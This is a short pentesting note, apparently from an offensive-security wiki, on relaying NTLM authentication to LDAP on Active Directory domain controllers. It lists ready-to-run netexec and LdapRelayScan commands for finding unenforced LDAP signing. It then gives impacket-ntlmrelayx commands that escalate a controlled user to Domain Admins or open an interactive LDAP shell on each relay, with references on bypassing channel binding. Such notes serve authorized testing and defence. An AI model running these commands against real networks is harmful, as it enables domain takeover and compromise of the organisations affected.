---
title: NTLM Relay to LDAP
---

The [[notes/network/ldap]] service on domain controllers can be used as [[notes/ad/ntlm-relay-sink]].

Verify that LDAP Signing or LDAPS Channel Binding is not enforced.

=== "[[notes/tools/netexec]]"
    ~~~ bash
    netexec ldap dc01.corp.local -u jdoe -p passw0rd -M ldap-checker
    ~~~

=== "[LdapRelayScan](https://github.com/zyn3rgy/ldaprelayscan)"
    ~~~ bash
    python3 ./LdapRelayScan.py -method BOTH -u jdoe -p passw0rd -dc-ip 172.21.4.50
    ~~~

When relaying computer accounts use [[notes/ad/rbcd]] or [[notes/ad/shadow-credentials]].
When relaying user accounts use [[notes/ad/shadow-credentials]].

When relaying a domain admin add a user you already control to the domain admins group.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    sudo impacket-ntlmrelayx -smb2support --no-dump --escalate-user jdoe --target ldaps://dc01.corp.local
    ~~~

Alternatively you can open an interactive LDAP shell for each successful relay.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    sudo impacket-ntlmrelayx -smb2support --interactive --target ldaps://dc01.corp.local
    ~~~

References:

- [Additional LDAP Interactive Shell Features](https://github.com/fortra/impacket/pull/1076), LDAP shell now has `add_computer`, `change_password` and `get_laps_password` commands
- [twitter.com/Geiseric4/status/1657681157046124544](https://twitter.com/Geiseric4/status/1657681157046124544), relay HTTP to LDAP with `ntlmrelayx.exe`
- [Bypassing LDAP Channel Binding with StartTLS](https://web.archive.org/web/20221220093350/https://offsec.almond.consulting/bypassing-ldap-channel-binding-with-starttls.html), only if LDAP signing is not required
- [LDAP authentication in Active Directory environments](https://web.archive.org/web/20231104171250/https://offsec.almond.consulting/ldap-authentication-in-active-directory-environments.html)
